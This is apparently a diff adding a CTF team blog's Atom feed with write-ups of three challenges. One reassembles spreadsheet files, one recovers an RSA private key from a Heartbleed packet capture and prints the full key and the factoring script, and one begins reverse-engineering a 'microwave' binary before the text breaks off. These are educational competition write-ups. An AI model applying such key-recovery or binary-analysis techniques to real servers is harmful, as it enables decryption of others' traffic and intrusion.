+    &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;files2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;files1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#reorder the blob&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;files1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;files2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# create the files1&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;files1.ods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_files1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# clean the sample&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;final_files1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;working_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x708&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# create the files2&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;files2.ods&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_files2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;# clean the sample&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;final_files2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;working_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x708&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After running our script we were left with two files:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;
+file files1.ods 
+files1.ods: OpenDocument Spreadsheet
+&lt;/code&gt;&lt;br /&gt;
+After opening the first file with &lt;a href=&quot;https://fr.libreoffice.org/&quot;&gt;Libreoffice&lt;/a&gt; we&lt;br /&gt;
+were greeted by:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/resources/2016/ndh/catch_me_if_you_can/screen_file1.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fun isn’t it…&lt;/p&gt;
+
+&lt;p&gt;Digging in the 2nd file is more profitable, it show us a sort of table with&lt;br /&gt;
+alphabetic and letter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/resources/2016/ndh/catch_me_if_you_can/screen_file2.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;if you scroll to the &lt;strong&gt;1048576&lt;/strong&gt; line vertical and to the top right most, yes there are&lt;br /&gt;
+serious… you’ll found a “code”:&lt;br /&gt;
+&amp;gt; g6d5g5f2b6g5d3e4d4b3c5b6k2j5j5g4l2&lt;/p&gt;
+
+&lt;p&gt;Using this code with the weird alphbetical table give us the flag: &lt;strong&gt;ndh[wh3re1sw@lly]&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Challenges resources are available in the &lt;a href=&quot;https://github.com/duksctf/duksctf.github.io/tree/master/resources/2016/ndh/catch_me_if_you_can&quot;&gt;resources&lt;br /&gt;
+folder&lt;/a&gt;&lt;/p&gt;
+
+</content>
+		</entry>
+	
+		<entry>
+			<title>Insomni'hack 2016 - Pcapbleeding</title>
+			<link href="http://duksctf.github.io/blog/2016/03/21/Inso2016-pcapbleeding"/>
+			<updated>2016-03-21T00:00:00+01:00</updated>
+			<id>http://duksctf.github.io//blog/2016/03/21/Inso2016-pcapbleeding</id>
+			<content type="html">&lt;p&gt;The &lt;a href=&quot;http://insomnihack.ch/&quot;&gt;Insomni’hack&lt;/a&gt; conference and CTF happened last Friday in Geneva, as usual it was a lot of fun. And as usual, Dragon Sector won the CTF, beating a few other world-class teams that made the trip for this on-site jeopardy CTF. About 80 teams registered, and the final ranking looks as follows for the first 25 teams:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/resources/2016/insomnihack/pcapbleeding/ranking.png&quot; alt=&quot;Ranking&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There was only one challenge in the crypto category, “pcapbleeding”. With such a name, the vulnerability was obvious: &lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;. We were given three files&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;&lt;code&gt;attack_log.pcap&lt;/code&gt;, a capture of a partial TLS session&lt;/li&gt;
+        &lt;li&gt;&lt;code&gt;hb_scrt_ch.crt&lt;/code&gt;, the certificate of the server&lt;/li&gt;
+        &lt;li&gt;&lt;code&gt;pcap_flag.pcapng&lt;/code&gt;, this one is self-explanatory&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I worked on this challenge with my teammate Brecht Wyseur from the duks team. Here’s how we solved it:&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Our first step was to look at the certificate and extract its public key.We did this with the command&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;openssl x509 -in hb_scrt.crt -text&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and then manually copied the RSA-2048 modulus, equal to&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x00bf683ed2cc8c1f259bbf6428904cd5c32ae974e9bb1b52e39a31451923b4dbbd9502e34fec0a0441da9cc8ebdb2970ee9f945d4b01f1971ea3512f63c37f696c68bd34f552d9f2a92fa03a7e5965f2f9d80134c9dea1aa94732a506a114bc6160ab8d99c875922037a0bf39345d4ed0502270d3774f160163716db5c3f393c1d68f4a00c8c301b38ff9ba053eb9b7e1d60968761e6d3134abae2e04afc94069facd0566d93f11998be89ea4ac03f169c2f1da87ca15e997a4acf67c64052768ba00881f6288ddbb2bb6815935315ef52db939dd3e1cb39eafb188985ca445cee8b7f26a179770dca2f36d3d35bb7faef629d392a943a5cbad41d2ffabf4e1d61&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The second step was to recover part of the private key from the network capture, doing first&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tcpflow -r attack_log.pcap&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;in order to extract the reassembled content of the TCP session. Then the only thing we had to do was to lazily look for a prime number that factored the modulus in this dump, namely in the file &lt;code&gt;192.168.105.160.00443-192.168.105.001.40572&lt;/code&gt; (obviously, the private key parts needed to be in the data sent from the server to the client). To do this I wrote the following script:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyprimes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isprime&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00bf683ed2cc8c1f259bbf6428904cd5c32ae974e9bb1b52e39a31451923b4dbbd9502e34fec0a0441da9cc8ebdb2970ee9f945d4b01f1971ea3512f63c37f696c68bd34f552d9f2a92fa03a7e5965f2f9d80134c9dea1aa94732a506a114bc6160ab8d99c875922037a0bf39345d4ed0502270d3774f160163716db5c3f393c1d68f4a00c8c301b38ff9ba053eb9b7e1d60968761e6d3134abae2e04afc94069facd0566d93f11998be89ea4ac03f169c2f1da87ca15e997a4acf67c64052768ba00881f6288ddbb2bb6815935315ef52db939dd3e1cb39eafb188985ca445cee8b7f26a179770dca2f36d3d35bb7faef629d392a943a5cbad41d2ffabf4e1d61&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# convert to int&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isprime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;factor found: &#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;which after a few seconds found the prime factor&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;162800346840897460776468813649884118748559125156676009651818806350253200631182399318398587210444328205266057474343495440234163281091254518673126741452325095375914485073473011961346710968389549502805048181472650809456469931148070907250674606060817482309018037066114703019632076408777754991395159477650420299677&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Note the &lt;code&gt;reverse()&lt;/code&gt; in the code above, to parse numbers in little-endian rather than big-endian order. We first overlooked this detail and lost almost an hour…&lt;/p&gt;
+
+&lt;p&gt;To decrypt the encrypted data, you could just use Wireshark. It takes the private key in PEM format, which in this case yields&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAry8C7aRdXa8bbb48yc0KVJ0QJZBVgnMK+yXznOdPFr71Gqun
+4CM2F0aAwNpP6Ff+aQeSaWGKLoibEELWWE7BxrKUPui5fChqd7ftvi47lxUrT6cZ
+7AkrigL7dmdXV53D/8uv6pmOtZs2T4rCSMRyLm88x642hvOP3r7XjZEeDbexvGul
+Yd9NN5U8+icL8PNsZIxOZ6mUgK79X3RW5Gy3+cfZuIj8m6qwLCXn/bF8DENvzV33
+sNDgv6biKOFSzlBo1g/n6wyBLUp2UB8cq8ir8/7LXDe4iSw/ox3DNyft3AnyMe7c
+3SiM2si9O4zGchT7xIbhRrKaFv1y6LtGALro5wIDAQABAoIBADKsSY+OBMfNmASF
+i7XfzoYtLHeBKYrjViDRmIchTXpJ4EJHtvaZmNLgvOuL+qM9mMSuwQYkhcDyGNB6
+VOAUX+7mxwTvcn/cfPeGR4nEe842/GE8972T5Xk1ZaGZQOWCKCi8tXUJ2ALmE66s
+d4hu8oxF9vHXjcQ5fbszvswfVu8mYd/duTncfIrcCO7lszWm6Bv9D1u/D/gF96Ud
+yu4hSqGhv4cT4szfkwls4xXz55eFAPpbwFIB2lxVUEetbEpKIRpgi++IPMO3xGcD
+b4/k132iX/Hcaeo2+2LhjKxDU4bkecLvRPYIDvA//tA7GUsWjWoiVyKx+YfE96EV
+BTVmvakCgYEA3xngcKf9T06/gGc39a5ohGOy4Ee/W9cuCTNuTjiEou7B9flky+4j
++4UWrcE7xX4oYXib7DazDXsdIw7N9UGbpCEysvWKM4poIorl/32BLaX+QzZSLn8e
+KmbeL0ZHOy8iHM6/iqbb7eMBWKstVgoAflbiAoOXAh/VwafqHuUBg0sCgYEAyQQ9
+Kea7+NBRILIDHMAvPh8OWT/thS0QHeYiGFZlCktyVw/PZgzEPui32R2krGvS6NoW
+zUQmtMJVo4oxIRTdIJUiQ2vG37LkmCU2pgBYi0ad+FMaoJ+Ww8sHlPFZsubreIpK
+8FDVuuCDD3vxK3p2Hm4etyBvJC75kew0QapbU1UCgYBGLlW0GqRMtnD3a4DnAB5Q
+xywV8Xv44A/TRSKF6LGQr5rETdevbxJSpOMldYvf7He3ccFa5ToeG4Rm6tlPNXxI
+fUj9ktAOtpNbimYfoNNqELWTXxsrFUHgBMwQAwOVUpZgiYknjKXSh3587hws3Kib
+FamzMMHoISuU58V2QoPfUQKBgH3d1Z6DB3hImEPsst4xyGMRdx6TVNpq2QifrQGo
+NyQ3EaVKFQdFPyxU86lTUmVULn/27wgggEv200DPquuX8M4SE547wg8YKOLLimhv
+FwI+eXOgNbAVvYVjf5/Xb98BkLetgDbxpqKZKfdsGBqtV4C+WyU3feAeOc8RI7dq
+QDzxAoGAEF1LwoWPh94YVJs/f1Tjk3euX5YjXLj5StbsV2DOA9wtqL5DPrL9JmpY
+gXsNl4AeeDwSlAkh8+KXKJ+AZVvGjQnIwU8jAvtee3cOYhvHUAXDB1b+yLe6Z2q4
+knqPghny1B3tfhbT9ow4jtrlm8jiumhVwg44gQhmcSSiRCMBwfs=
+-----END RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I used some script found online to make the conversion. Loading it in Wireshark to decrypt the encrypted capture then directly gave the flag: &lt;code&gt;INS={HB_pr1v4te_key5_le3k}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/resources/2016/insomnihack/pcapbleeding/wireshark.png&quot; alt=&quot;wireshark&quot; /&gt;&lt;/p&gt;
+
+</content>
+		</entry>
+	
+		<entry>
+			<title>Insomni'hack 2016 - Microwave</title>
+			<link href="http://duksctf.github.io/blog/2016/03/21/Inso2016-microwave"/>
+			<updated>2016-03-21T00:00:00+01:00</updated>
+			<id>http://duksctf.github.io//blog/2016/03/21/Inso2016-microwave</id>
+			<content type="html">&lt;p&gt;This is a write-up for the &lt;em&gt;microwave&lt;/em&gt; pwn of &lt;a href=&quot;https://insomnihack.ch/&quot;&gt;Insomni’hack&lt;/a&gt; CTF (first published on &lt;a href=&quot;https://deadc0de.re/articles/microwave-write-up.html&quot;&gt;deadc0de.re&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;Following binaries were given:&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;&lt;em&gt;microwave_61f50dba931bb10ab3089215b2e188f4&lt;/em&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;em&gt;libc.so.6&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Those are both available &lt;a href=&quot;https://github.com/deadc0de6/ctf/tree/master/2016-insomnihack&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;the-program&quot;&gt;The program&lt;/h2&gt;
+&lt;p&gt;The program simulates a microwave able to connect to twitter and tweets your favorite food.&lt;/p&gt;
+
+&lt;p&gt;There are 4 options:&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;
+&lt;ol style=&quot;list-style-type:decimal;&quot;&gt;
+        &lt;li&gt;&lt;em&gt;Connect to Twitter account&lt;/em&gt;: asks for username and password to connect to twitter&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+        &lt;li&gt;
+&lt;ol style=&quot;list-style-type:decimal;&quot; start=&quot;2&quot;&gt;
+        &lt;li&gt;&lt;em&gt;Edit your tweet&lt;/em&gt;: edit content of the tweet(s) to be sent&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+        &lt;li&gt;
+&lt;ol style=&quot;list-style-type:decimal;&quot; start=&quot;3&quot;&gt;
+        &lt;li&gt;&lt;em&gt;Grill &amp;amp; Tweet your food&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+        &lt;li&gt;
+&lt;ol style=&quot;list-style-type:decimal;&quot; start=&quot;4&quot;&gt;
+        &lt;li&gt;&lt;em&gt;Exit&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Connect to twitter:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+ --------------------------------------------------------
+ |     Welcome to the next generation of MicroWaves!    |
+ |                         ***                          |
+ | This stylish Microwave with Grill function, includes |
+ |      a function that tweets your favourite food!     |
+ |                         ***                          |
+ --------------------------------------------------------
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: 1
+
+           Log in on Twitter:
+           username: test
+           password: test
+
+Checking test
+Twitter account
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Edit your tweet:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: 2
+
+           #&amp;gt; some blabla
+
+           Done.&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Grill and tweet:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: 3
+
+
+
+  Okay! Let&#39;s do this!
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here are the protections of the binary&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::bash
+$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
+[*] &#39;/tmp/microwave_61f50dba931bb10ab3089215b2e188f4&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&lt;/h2&gt;
+&lt;!--more--&gt;
+&lt;h2 id=&quot;the-vulnerabilities&quot;&gt;The vulnerabilities&lt;/h2&gt;
+&lt;h3 id=&quot;find-the-password&quot;&gt;Find the password&lt;/h3&gt;
+&lt;p&gt;First we need a valid username/password to connect to the fake Twitter account. The username can be anything, however the function containing the &lt;em&gt;Checking&lt;/em&gt; string shows where the password is checked (and what it is):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+[0x00000ac0]&amp;gt; iz | grep Checking
+[0x00000ac0]&amp;gt; axt 0x00002ac0
+data 0xf03 lea rsi, [rip + 0x1bb6] in sub.__printf_chk_f00
+[0x00000ac0]&amp;gt; pd @0xf03
+
+... (snip) ...
+
+      0x00000f98      488b1d713020.  mov rbx, qword [rip + 0x203071] ; [0x204010:8]=0x2b56 str.n07_7h3_fl46 ; &quot;V
+      0x00000f9f      4889df         mov rdi, rbx
+      0x00000fa2      e849faffff     call sym.imp.strlen         ;[7]
+      0x00000fa7      31d2           xor edx, edx
+  ,=&amp;lt; 0x00000fa9      eb13           jmp 0xfbe                   ;[9]
+  |   0x00000fab      0f1f440000     nop dword [rax + rax]
+  |   ; JMP XREF from 0x00000fc1 (sub.__printf_chk_f00)
+ .--&amp;gt; 0x00000fb0      0fb60c13       movzx ecx, byte [rbx + rdx]    // LOAD THE PASSWORD CHAR
+ ||   0x00000fb4      384c1528       cmp byte [rbp + rdx + 0x28], cl ; [0xa:1]=0 // COMPARE PROVIDED PASSWORD CHAR
+,===&amp;lt; 0x00000fb8      752e           jne 0xfe8                   ;[?]
+|||   0x00000fba      4883c201       add rdx, 1                     // NEXT CHAR
+|||   ; JMP XREF from 0x00000fa9 (sub.__printf_chk_f00)
